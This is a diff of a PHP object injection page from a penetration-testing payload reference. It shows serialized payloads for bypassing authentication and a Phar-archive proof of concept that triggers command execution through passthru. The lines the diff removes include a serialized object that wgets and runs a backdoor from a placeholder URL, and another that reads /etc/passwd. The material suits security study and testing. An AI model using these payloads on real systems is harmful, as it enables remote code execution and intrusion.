@@ -10,7 +10,16 @@ The following magic methods will help you for a PHP Object injection
 
 Also you should check the `Wrapper Phar://` in [File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phar) which use a PHP object injection.
 
-## __wakeup in the unserialize function
+## Summary
+
+* [General concept](#general-concept)
+* [Authentication bypass](#authentication-bypass)
+* [Finding and using gadgets](#finding-and-using-gadgets)
+* [Real world examples](#real-world-examples)
+* [PHP Phar Deserialization](#php-phar-deserialization)
+* [References](#references)
+
+## General concept
 
 Vulnerable code:
 
@@ -38,7 +47,7 @@ Vulnerable code:
 ?>
 ```
 
-Payload:
+Craft a payload using existing code inside the application.
 
 ```php
 # Basic serialized data
@@ -102,35 +111,15 @@ Payload:
 O:6:"Object":2:{s:10:"secretCode";N;s:4:"guess";R:2;}
 ```
 
-## Others exploits
-
-Reverse Shell
+We can do an array to like this:
 
 ```php
-class PHPObjectInjection
-{
-    // CHANGE URL/FILENAME TO MATCH YOUR SETUP
-    public $inject = "system('wget http://URL/backdoor.txt -O phpobjbackdoor.php && php phpobjbackdoor.php');";
-}
-
-echo urlencode(serialize(new PHPObjectInjection));
-```
-
-Basic detection
-
-```php
-class PHPObjectInjection
-{
-    // CHANGE URL/FILENAME TO MATCH YOUR SETUP
-    public $inject = "system('cat /etc/passwd');";
-}
-
-echo urlencode(serialize(new PHPObjectInjection));
-//O%3A18%3A%22PHPObjectInjection%22%3A1%3A%7Bs%3A6%3A%22inject%22%3Bs%3A26%3A%22system%28%27cat+%2Fetc%2Fpasswd%27%29%3B%22%3B%7D
-//'O:18:"PHPObjectInjection":1:{s:6:"inject";s:26:"system(\'cat+/etc/passwd\');";}'
+a:2:{s:10:"admin_hash";N;s:4:"hmac";R:2;}
 ```
 
 ## Finding and using gadgets
+
+Also called "PHP POP Chains", they can be used to gain RCE on the system.
 
 [PHPGGC](https://github.com/ambionics/phpggc) is a tool built to generate the payload based on several frameworks:
 
@@ -146,6 +135,50 @@ echo urlencode(serialize(new PHPObjectInjection));
 phpggc monolog/rce1 'phpinfo();' -s
 ```
 
+## PHP Phar Deserialization
+
+Using `phar://` wrapper, one can trigger a deserialization on the specified file like in `file_get_contents("phar://./archives/app.phar")`.
+
+A valid PHAR includes four elements:
+
+1. Stub
+2. Manifest
+3. File Contents
+4. Signature
+
+Example of a Phar creation in order to exploit a custom `PDFGenerator`.
+
+```php
+<?php
+class PDFGenerator { }
+
+//Create a new instance of the Dummy class and modify its property
+$dummy = new PDFGenerator();
+$dummy->callback = "passthru";
+$dummy->fileName = "uname -a > pwned"; //our payload
+
+// Delete any existing PHAR archive with that name
+@unlink("poc.phar");
+
+// Create a new archive
+$poc = new Phar("poc.phar");
+
+// Add all write operations to a buffer, without modifying the archive on disk
+$poc->startBuffering();
+
+// Set the stub
+$poc->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");
+
+/* Add a new file in the archive with "text" as its content*/
+$poc["file"] = "text";
+// Add the dummy object to the metadata. This will be serialized
+$poc->setMetadata($dummy);
+// Stop buffering and write changes to disk
+$poc->stopBuffering();
+?>
+```
+
+
 ## Real world examples
 
 * [Vanilla Forums ImportController index file_exists Unserialize Remote Code Execution Vulnerability - Steven Seeley](https://hackerone.com/reports/410237)
@@ -156,10 +189,14 @@ phpggc monolog/rce1 'phpinfo();' -s
 ## References
 
 * [PHP Object Injection - OWASP](https://www.owasp.org/index.php/PHP_Object_Injection)
-* [PHP Object Injection - Thin Ba Shane](http://location-href.com/php-object-injection/)
+* [Utilizing Code Reuse/ROP in PHP](https://owasp.org/www-pdf-archive/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf)
 * [PHP unserialize](http://php.net/manual/en/function.unserialize.php)
 * [PHP Generic Gadget - ambionics security](https://www.ambionics.io/blog/php-generic-gadget-chains)
 * [POC2009 Shocking News in PHP Exploitation](https://www.owasp.org/images/f/f6/POC2009-ShockingNewsInPHPExploitation.pdf)
 * [PHP Internals Book - Serialization](http://www.phpinternalsbook.com/classes_objects/serialization.html)
-* [TSULOTT Web challenge write-up from MeePwn CTF 1st 2017 by Rawsec](https://rawsec.ml/en/MeePwn-2017-write-ups/#tsulott-web)
+* [TSULOTT Web challenge write-up from MeePwn CTF 1st 2017 by Rawsec](https://rawsec.ml/en/meepwn-2017-write-ups/#TSULOTT-Web)
 * [CTF writeup: PHP object injection in kaspersky CTF](https://medium.com/@jaimin_gohel/ctf-writeup-php-object-injection-in-kaspersky-ctf-28a68805610d)
+* [Jack The Ripper Web challeneg Write-up from ECSC 2019 Quals Team France by Rawsec](https://rawsec.ml/en/ecsc-2019-quals-write-ups/#164-Jack-The-Ripper-Web)
+* [Rusty Joomla RCE Unserialize overflow](https://blog.hacktivesecurity.com/index.php?controller=post&action=view&id_post=41)
+* [PHP Pop Chains - Achieving RCE with POP chain exploits. - Vickie Li - September 3, 2020](https://vkili.github.io/blog/insecure%20deserialization/pop-chains/)
+* [How to exploit the PHAR Deserialization Vulnerability - Alexandru Postolache - May 29, 2020](https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability/)
